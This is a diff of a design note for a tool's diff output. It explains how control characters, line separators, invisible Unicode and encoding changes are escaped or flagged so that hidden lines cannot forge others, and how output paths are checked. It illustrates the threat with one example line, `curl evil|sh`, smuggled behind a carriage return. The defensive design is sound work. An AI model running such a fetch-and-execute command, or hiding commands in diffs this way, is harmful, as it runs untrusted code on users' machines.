@@ -80,20 +80,23 @@ Checked against `main` (`a290700`):
   lenient UTF-8. Either way each byte that cannot be decoded is shown as a `\x..` escape. No file is ever reduced to
   `Binary files … differ`: a script with a NUL byte and a stray byte still runs, so its lines must show. `_decode`
   becomes public with an `errors` argument: the scan keeps `replace`, the diff passes `surrogateescape`, so a byte
-  that cannot be decoded stays apart from the text and is escaped as itself. A file whose bytes differ but whose two
-  sides decode to the same lines, re-encoded or given a byte order mark, would show a header and no hunk: both sides
-  are then shown byte for byte, as lenient UTF-8, after a line
+  that cannot be decoded stays apart from the text and is escaped as itself. `hidden.decode_as` returns the encoding
+  too (`UTF-8`, `UTF-16`, `UTF-32` or `lenient UTF-8`), so a file read in another encoding than before gets a line
+  `# <path>: read as UTF-8, now as UTF-16`: a re-encode beside an edit would otherwise show only the edit. A file
+  whose bytes differ but whose two sides decode to the same lines, re-encoded or given a byte order mark, would show a
+  header and no hunk: both sides are then shown byte for byte, as lenient UTF-8, after a line
   `# <path>: shown byte for byte, as its two sides read alike as text`.
 
 - **No line passes for another.** Lines are split at `\n` only, as git splits them, but an editor also breaks lines
   at `\r`, `\v`, `\f`, U+0085, U+2028 and U+2029: a raw `+ok\rcurl evil|sh` would show `curl evil|sh` on a line of its
   own, without its `+`, or forge a `#` line; an invisible character makes two lines look alike that are not. In each
   line these are escaped as `\x..`, `\u....` or `\U........`: every control character but tab (below U+0020, U+007F,
-  U+0080 to U+009F); U+2028 and U+2029; every character in `hidden.CRITICAL` or `hidden.WARNING`. A literal `\x0d` in
-  the text reads the same as an escaped carriage return. Within a file that only matters when two different lines
-  would read alike, such as a typed `echo \x80` turned into the byte: a change that showed as nothing, or as two
-  equal lines. Then every backslash of that file is shown doubled, after a line
-  `# <path>: each backslash shown doubled, as its lines would read alike`; other files keep single backslashes, as
+  U+0080 to U+009F); U+2028 and U+2029; U+FEFF, invisible yet in neither of APM's sets; every character in
+  `hidden.CRITICAL` or `hidden.WARNING`. `\x..` is kept for code points below U+0080 and for bytes that cannot be
+  decoded, all from 0x80, and every other character is `\u....` or `\U........`: a stray 0xAD and a soft hyphen would
+  both read `\xad`. A typed `\x1b` still reads the same as an escaped ESC, on the same line or on another. So a
+  shown file holding both a backslash and a character to escape has every backslash doubled, after a line
+  `# <path>: each backslash shown doubled, so no typed escape reads as one`; other files keep single backslashes, as
   they read better.
 
 - **A Myers diff on a step budget, git's format around it.** `difflib`'s `SequenceMatcher` is quadratic or worse on
@@ -161,9 +164,9 @@ Checked against `main` (`a290700`):
   - its name does not end in `.diff`: harnesses load Markdown, YAML and their own formats, never a `.diff`, so the
     file is not taken for a command, rule or agent wherever it lands;
   - a folder of the path as given, without `..`, or of the resolved path is named `.apm` in any case
-    (`paths.folded`, as `build --into` checks: `.APM` is the same folder on macOS and Windows, and a link named
-    `.apm` leads a harness into it), or a folder of the resolved path holds a `SKILL.md`, so it is a **Skill**'s
-    folder or inside one, deployed or vendored;
+    (`paths.folded`, as `build --into` checks: `.APM` is the same folder on macOS and Windows), or holds a
+    `SKILL.md`, so it is a **Skill**'s folder or inside one, deployed or vendored; as given too, since a harness
+    walking a package or a **Skill** follows a link inside it;
   - its folder does not exist, so the run fails before fetching, not at its last write;
   - the path exists and is not a regular file (`lstat`: a symbolic link, folder, FIFO or device), so nothing blocks or
     reads without end;
